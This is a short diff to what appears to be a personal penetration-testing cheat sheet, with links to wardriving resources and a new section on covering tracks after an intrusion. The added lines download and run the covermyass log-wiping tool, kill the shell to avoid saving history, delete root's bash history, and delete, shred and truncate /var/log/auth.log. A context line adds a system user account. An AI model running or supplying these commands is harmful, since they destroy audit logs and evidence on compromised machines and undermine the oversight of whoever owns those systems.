@@ -8,6 +8,25 @@
 #https://api.wigle.net/
 #https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/
 
+## CANARY TOKENS
+canarytokens.com/generate 
+
+### LOGS ##### 
+kill -9 $$ ## exits the terminal without saving history 
+wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
+chmod +x covermyass
+./covermyass
+# BASH HISTORY 
+cd /dev/shm/
+rm /root/.bash_history 
+## or edit the var $HISTSIZE and $HISTFILESIZE 
+# AUTH-LOG FILES 
+cd /var/log
+sudo rm auth.log 
+shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
+truncate -s 0 /var/log/auth.log 
+
+
 ## To add new user 
 useradd -r user2 
 
